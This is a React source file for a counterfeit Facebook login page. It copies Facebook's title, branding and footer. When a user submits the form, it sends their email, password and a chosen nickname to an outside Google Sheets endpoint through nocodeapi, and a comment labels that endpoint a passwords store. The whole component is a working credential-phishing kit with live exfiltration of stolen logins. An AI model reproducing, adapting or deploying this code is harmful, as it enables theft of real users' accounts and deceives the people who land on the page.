import React, { useState, useEffect } from "react";
import styles from  '../../Assets/Styles/facebook-form.css';
import axios from 'axios';
import Popup from "./Popup";

const FacebookForm = () => {
    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    const [redBorder, setRedBorder] = useState(false)

    const [loaderState, setLoaderState] = useState(false)
    const [PopupState, setPopupState] = useState(false)
    const [nicknameVal, setNicknameVal] = useState('')

    useEffect(() => {
        document.title = 'Log in - Facebook'

        return () => {
            document.title = 'Document'
        }
    }, [])

    const sendEmail = (e) => {
        e.preventDefault();

        if (password.length < 8) {
            setRedBorder(true)
            return;
        } else {
            setRedBorder(false)
        }

        setLoaderState(true)
        let date = new Date().toLocaleDateString('en-us', { year:"numeric", month:"short", day:"numeric"}) 
        let id = `F${Math.round(Date.now() * Math.random())}`

        axios ({
            method: 'post',
            url: 'https://v1.nocodeapi.com/tuxa3/google_sheets/bERXdJyFTjGsXOJm?tabId=Sheet1', // passwords txt (1, 3)
            params: {},
            data: [[id, nicknameVal, email, password, date]]
        }).then(function () {
            setLoaderState(false)
            setPopupState(false)
        }).catch(function (error) {
            alert('Authentication Failed... Please try again', error)
            console.log(error); 
        })

        setEmail('')
        setPassword('')
    };

    const renderLoader = () => {
        if (loaderState) {
                return (
                    <div className="ui segment">
                    <p></p>
                    <div className="ui active inverted dimmer">
                        <div className="ui loader"></div>
                    </div>
                </div>
            )
        }
    }

    return (
        <div style={styles} className="facebook-container">
            <div className="title-wrapper">
                <p className="title-f"><strong>facebook</strong></p>
            </div>
            <form onSubmit={(e) => {
                e.preventDefault()
                    setPopupState(true)}
                }>
                <div className="item">
                    <input type="email" placeholder="Mobile number or email" name="_email" onChange={(e) => setEmail(e.target.value)} value={email} required/>
                </div>
                <div className="item">
                    <input className={`${redBorder ? 'red-border' : ''}`} min={8} type="password" placeholder="Password" name="_password" onChange={e => setPassword(e.target.value)} value={password} required/>
                </div>
                <button formAction="submit" className="login-btn">Log in</button>
                <a href="https://www.facebook.com/help/">Forgot password?</a>
            </form>
            <div className="hr-wrapper">
                <hr />
                <p>or</p>
                <hr />
            </div>
            <div className="cr-new-acc-button">
                <button onClick={() => window.location.href = 'https://www.facebook.com/'}>Create new account</button>
            </div>


            {PopupState ? <Popup title='Enter an Username' icon='user' placeholder='John Doe' onSubmitClick={sendEmail} onCancelClick={() => setPopupState(false)} onChangeHandler={setNicknameVal}/> : null}


            <footer>
                <div className="upper-part">
                    <div className="language-side">
                        English (US) <br />
                        Русский <br />
                        Deutsch <br />
                        Português (Brazil) <br />
                    </div>
                    <div className="language-side">
                        ქართული <br />
                        Türkçe  <br />
                        Español <br />
                        <i style={{border: '1px gray solid', color: 'gray', borderRadius: '4px', padding: '5px'}} className="fa fa-thin fa-plus"></i>
                    </div>
                </div>
                <div className="bottom-part">
                    <span>
                        About · Help · More
                    </span>
                    <span>
                        Meta © 2022
                    </span>
                </div>
            </footer>

            { renderLoader () }
        </div>
    )
}

export default FacebookForm;